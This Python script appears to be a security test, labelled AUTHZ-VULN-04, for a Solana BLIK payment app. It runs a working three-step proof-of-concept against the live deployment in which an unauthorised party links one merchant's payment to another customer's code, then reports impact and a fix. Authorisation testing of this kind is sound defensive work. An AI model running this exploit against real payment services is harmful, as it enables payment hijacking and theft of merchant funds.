#!/usr/bin/env python3
"""
Security Test: AUTHZ-VULN-04
Test if POST /api/payments/link allows linking any code to any payment without ownership validation.

Multi-Step Test:
1. Merchant A creates payment
2. Customer B generates code
3. Attacker C (who owns neither) links them together (the exploit)
"""

import requests
import json
from datetime import datetime

BASE_URL = "https://solana-blik.vercel.app"

# Test wallets representing different actors
MERCHANT_A_WALLET = "11111111111111111111111111111111"
CUSTOMER_B_WALLET = "22222222222222222222222222222222"

def print_section(title):
    """Print a formatted section header"""
    print("\n" + "=" * 80)
    print(f"  {title}")
    print("=" * 80)

def print_request(method, url, body=None):
    """Print request details"""
    print(f"\n[REQUEST] {method} {url}")
    if body:
        print(f"Body: {json.dumps(body, indent=2)}")

def print_response(response):
    """Print response details"""
    print(f"\n[RESPONSE] Status: {response.status_code}")
    try:
        print(f"Body: {json.dumps(response.json(), indent=2)}")
    except:
        print(f"Body: {response.text}")

def step1_merchant_creates_payment():
    """Step 1: Merchant A creates a payment"""
    print_section("STEP 1: Merchant A Creates Payment")

    url = f"{BASE_URL}/api/payments/create"
    payload = {
        "amount": 2.0,
        "merchantWallet": MERCHANT_A_WALLET
    }

    print_request("POST", url, payload)

    response = requests.post(url, json=payload)
    print_response(response)

    if response.status_code == 200:
        data = response.json()
        payment_id = data.get("paymentId")
        print(f"\n✓ Payment created successfully")
        print(f"  Payment ID: {payment_id}")
        print(f"  Owner: Merchant A ({MERCHANT_A_WALLET})")
        return payment_id
    else:
        print(f"\n✗ Failed to create payment")
        return None

def step2_customer_generates_code():
    """Step 2: Customer B generates a BLIK code"""
    print_section("STEP 2: Customer B Generates BLIK Code")

    url = f"{BASE_URL}/api/codes/generate"
    payload = {
        "walletPubkey": CUSTOMER_B_WALLET
    }

    print_request("POST", url, payload)

    response = requests.post(url, json=payload)
    print_response(response)

    if response.status_code == 200:
        data = response.json()
        code = data.get("code")
        print(f"\n✓ Code generated successfully")
        print(f"  Code: {code}")
        print(f"  Owner: Customer B ({CUSTOMER_B_WALLET})")
        return code
    else:
        print(f"\n✗ Failed to generate code")
        return None

def step3_attacker_links_resources(payment_id, code):
    """Step 3: Attacker C attempts to link payment and code without owning either"""
    print_section("STEP 3 (EXPLOIT): Attacker C Links Merchant A's Payment to Customer B's Code")

    print("\nATTACKER CONTEXT:")
    print(f"  - Payment ID: {payment_id} (owned by Merchant A)")
    print(f"  - Code: {code} (owned by Customer B)")
    print(f"  - Attacker C owns NEITHER resource")
    print(f"  - Attempting to link them without authorization...")

    url = f"{BASE_URL}/api/payments/link"
    payload = {
        "paymentId": payment_id,
        "code": code
    }

    print_request("POST", url, payload)

    response = requests.post(url, json=payload)
    print_response(response)

    return response

def analyze_vulnerability(response):
    """Analyze the response to determine if vulnerability exists"""
    print_section("VULNERABILITY ANALYSIS")

    if response.status_code == 200:
        try:
            data = response.json()
            matched = data.get("matched", False)
            amount = data.get("amount")

            if matched:
                print("\n🚨 VULNERABILITY CONFIRMED: AUTHZ-VULN-04")
                print("\nSeverity: CRITICAL")
                print("\nDescription:")
                print("  POST /api/payments/link allows ANY actor to link ANY code to ANY payment")
                print("  without validating ownership of either resource.")

                print("\nProof:")
                print(f"  ✓ Step 3 returned HTTP 200")
                print(f"  ✓ matched: {matched}")
                print(f"  ✓ amount: {amount}")
                print(f"  ✓ Attacker successfully linked resources they don't own")

                print("\nImpact:")
                print("  - Unauthorized payment completion")
                print("  - Payment hijacking attacks")
                print("  - Complete breakdown of authorization controls")
                print("  - Merchant funds can be stolen by linking arbitrary codes")

                print("\nRecommendation:")
                print("  Implement ownership validation in /api/payments/link:")
                print("  1. Verify the code belongs to the requesting user")
                print("  2. OR verify the payment belongs to the requesting user")
                print("  3. Require authentication and check ownership before linking")

                return True
            else:
                print("\n✓ VULNERABILITY NOT EXPLOITED")
                print("  Link attempt failed (matched: false)")
                return False
        except Exception as e:
            print(f"\n⚠ Error parsing response: {e}")
            return False
    elif response.status_code == 401 or response.status_code == 403:
        print("\n✓ SECURE: Authorization check in place")
        print(f"  Server returned {response.status_code}, blocking unauthorized access")
        return False
    else:
        print(f"\n⚠ Unexpected response: HTTP {response.status_code}")
        return False

def main():
    print_section(f"AUTHZ-VULN-04 Security Test - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    print("\nTest Scenario:")
    print("  Testing if /api/payments/link enforces authorization controls")
    print("  Three actors: Merchant A, Customer B, Attacker C")
    print("  Attacker C attempts to link A's payment to B's code")

    # Execute test steps
    payment_id = step1_merchant_creates_payment()
    if not payment_id:
        print("\n✗ Test failed: Could not create payment")
        return

    code = step2_customer_generates_code()
    if not code:
        print("\n✗ Test failed: Could not generate code")
        return

    # The exploit attempt
    response = step3_attacker_links_resources(payment_id, code)

    # Analyze results
    is_vulnerable = analyze_vulnerability(response)

    # Summary
    print_section("TEST SUMMARY")
    if is_vulnerable:
        print("\n🚨 RESULT: VULNERABLE")
        print("  The application allows unauthorized code-to-payment linking")
    else:
        print("\n✓ RESULT: SECURE or EXPLOIT FAILED")
        print("  The application blocked unauthorized access")

    print("\n" + "=" * 80 + "\n")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n✗ Test execution error: {e}")
        import traceback
        traceback.print_exc()
